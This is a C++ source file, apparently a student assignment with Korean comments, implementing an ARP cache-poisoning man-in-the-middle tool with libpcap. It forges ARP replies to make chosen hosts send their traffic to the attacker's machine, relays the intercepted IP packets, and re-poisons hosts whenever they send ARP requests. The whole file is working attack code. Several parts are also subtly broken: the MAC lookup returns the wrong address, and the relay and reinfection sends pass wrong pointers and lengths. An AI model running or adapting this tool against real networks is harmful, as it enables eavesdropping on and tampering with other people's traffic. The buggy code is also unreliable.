#include "ethhdr.h"
#include "arphdr.h"
#include <pcap.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <utility>
#include <bits/stdc++.h>
#include <arpa/inet.h>
#include <net/if.h> // ifreq
#include <netinet/in.h>
#include <netinet/ip.h> // ip structure
#include <netinet/if_ether.h>

#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

using namespace std;

char* dev;
char errbuf[PCAP_ERRBUF_SIZE];
pcap_t* handle;
Mac my_mac;
Ip my_ip;

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthIpPacket {
    EthHdr eth_;
    ip ip_;
};
#pragma pack(pop)

vector<pair<Ip, Ip>> FLOWS;
vector<pair<Ip, Mac>> ip_mac_table;

EthArpPacket make_packet(Mac ether_smac, Mac ether_dmac, uint16_t op, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = ether_dmac;
    packet.eth_.smac_ = ether_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op); // request = 1 or reply = 2
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(arp_sip);
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.tip_ = htonl(arp_tip);

    return packet;
}

Mac get_mac(Ip s_ip) {
    EthArpPacket packet = make_packet(
        my_mac,
        Mac("ff:ff:ff:ff:ff:ff"),
        1,
        my_mac,
        my_ip,
        Mac("00:00:00:00:00:00"),
        s_ip
    );

    int res = pcap_sendpacket(
        handle,
        reinterpret_cast<const u_char*>(&packet),
        sizeof(EthArpPacket)
    );

    while (1) {   
        struct pcap_pkthdr* header;
        const u_char* raw_packet;
        int res = pcap_next_ex(handle, &header, &raw_packet);
        if (res == 0) continue;
        EthArpPacket response_packet;
        memcpy(&response_packet, raw_packet, sizeof(EthArpPacket));
        if (ntohs(response_packet.arp_.op_) == ArpHdr::Reply && ntohl(response_packet.arp_.sip_) == s_ip) {
            return packet.arp_.smac_;
        }
    }
}

void attack() {
    for (int i = 0; i < FLOWS.size(); i++) {
        int flag1 = 0;
        int flag2 = 0;
        Mac sender_mac, target_mac;
        for (int j = 0; j < ip_mac_table.size(); j++) {
            if (FLOWS[i].first == ip_mac_table[j].first) {
                flag1 = 1;
                sender_mac = ip_mac_table[j].second;
            }
            if (FLOWS[i].second == ip_mac_table[j].first) {
                target_mac = ip_mac_table[j].second;
                flag2 = 1;
            }
        }
        if (!flag1 || !flag2) continue;
        printf("공격 성공\n");
        EthArpPacket attack_packet = make_packet(
            my_mac,
            sender_mac,
            2, // reply
            my_mac,
            FLOWS[i].second,
            sender_mac,
            FLOWS[i].first
        );
        int res = pcap_sendpacket(
            handle,
            reinterpret_cast<const u_char*>(&attack_packet),
            sizeof(EthArpPacket)
        );
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4) { // 실행에 필요한EthArpPacket최소 인자...
        return -1;
    }

    dev = argv[1];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        return -1;
    }

    for (int i = 2; i < argc; i+=2) {
        pair<Ip, Ip> p;
        p.first = Ip(argv[i]);
        p.second = Ip(argv[i + 1]);
        FLOWS.push_back(p);
    }

    for (int i = 0; i < FLOWS.size(); i++) {
        printf("%d %d\n", FLOWS[i].first, FLOWS[i].second);
    }

    // 인자로 들어오는 모든 (sender ip, target ip)를 감염시켜야 함...
    // 일단 공격하려면 my mac, my ip, sender mac, sender ip를 알아야 함...
    // for문으로 모든 정보를 다 얻자...

    struct ifreq ifr;
    int fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strcpy(ifr.ifr_name, dev);

    ioctl(fd, SIOCGIFHWADDR, &ifr);
    uint8_t mac_temp[6];
    for (int i = 0; i < 6; i++) {
        mac_temp[i] = ifr.ifr_addr.sa_data[i];
    }
    my_mac = Mac(mac_temp);

    ioctl(fd, SIOCGIFADDR, &ifr);
    my_ip = Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    
    printf("myip: %s\n", inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));

    
    // 각각의 pair에 있는 sender, target들의 Mac 주소 얻기...
    for (int i = 0; i < FLOWS.size(); i++) {
        pair<Ip, Mac> p1, p2;
        p1.first = FLOWS[i].first;
        p2.first = FLOWS[i].second;
        p1.second = get_mac(p1.first);
        p2.second = get_mac(p2.first);
        ip_mac_table.push_back(p1);
        ip_mac_table.push_back(p2);
    }

    // 모든 flow에 대한 정보를 얻었다면... 반복문으로 공격 패킷을 보내자...
    printf("Success!\n");
    printf("Attack!\n");
    attack();

    // 여기까지 모든 flow에 대한 공격을 했고...
    // 이젠 패킷을 받아서 relay 패킷을 보내보자.
    while (1) {
        struct pcap_pkthdr* header;
        const u_char* raw_packet;
        int res = pcap_next_ex(handle, &header, &raw_packet);
        struct EthArpPacket *packet = (struct EthArpPacket*) raw_packet;
        if (packet->eth_.type_ == htons(0x0800)) { // ip 패킷이라면...
            //printf("arp 패킷 아님!\n");
            struct ip* ip_header = (ip*) (raw_packet + sizeof(ether_header));
            struct EthIpPacket *ipv4 = (struct EthIpPacket *) raw_packet;

            Ip src_ip = Ip(inet_ntoa(ip_header->ip_src));
            Ip tar_ip = Ip(inet_ntoa(ip_header->ip_dst));
            //printf("ip : %s -> %s\n", inet_ntoa(ip_header->ip_src), inet_ntoa(ip_header->ip_dst));
            //if (check_spoofed.find(src_ip) != check_spoofed.end() && check_spoofed[src_ip] == tar_ip) {
            if (packet->eth_.dmac_ == my_mac && tar_ip != my_ip) {
                printf("spoofed 패킷 왔다!\n");  // spoofed 패킷 오는 거 확인함...
                // 이제 relay 패킷을 보내줘야 함...
                // relay 패킷을 보낼 때에는, 온 패킷에서...
                // ethernet header의 src mac을 my mac으로, dst mac을 target mac으로...
                printf("%s\n", inet_ntoa(ip_header->ip_src));
                Mac tar_mac = Mac("00:00:00:00:00:00");
                for (int i = 0; i < ip_mac_table.size(); i++) {
                    if (ip_mac_table[i].first == tar_ip) tar_mac = ip_mac_table[i].second;
                }
                if (tar_mac == Mac("00:00:00:00:00:00")) continue;
                memcpy((u_char *) (raw_packet), &tar_mac, 6);
                memcpy((u_char *) (raw_packet + 6), &my_mac, 6);
                //packet->eth_.smac_ = my_mac;
                //packet->eth_.dmac_ = ip_mac_table[ntohl(tar_ip)];
                int res = pcap_sendpacket(
                    handle,
                    reinterpret_cast<const u_char*>(&raw_packet),
                    sizeof(EthArpPacket)
                );
                printf("relay 패킷 보냄!\n");
                continue;
            } else continue;
        } else if (packet->eth_.type_ == htons(0x0806)) {
            if (packet->eth_.dmac_ == Mac("ff:ff:ff:ff:ff:ff") && packet->arp_.tmac_ == Mac("00:00:00:00:00:00")) { // broadcast라면...
                printf("브로드캐스트 패킷 들어옴! 전체 감염 공격!\n");
                attack();
                continue;
            }
            if (packet->arp_.tmac_ == my_mac) {
                EthArpPacket unicast_packet = make_packet(
                    my_mac,
                    packet->arp_.smac_,
                    2,
                    my_mac,
                    my_ip,
                    packet->arp_.smac_,
                    packet->arp_.sip_
                );

                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                printf("Unicast 패킷 들어옴. 재감염 패킷 보냄!\n");
                continue;
            }
        }
        
    }

    return 0;
}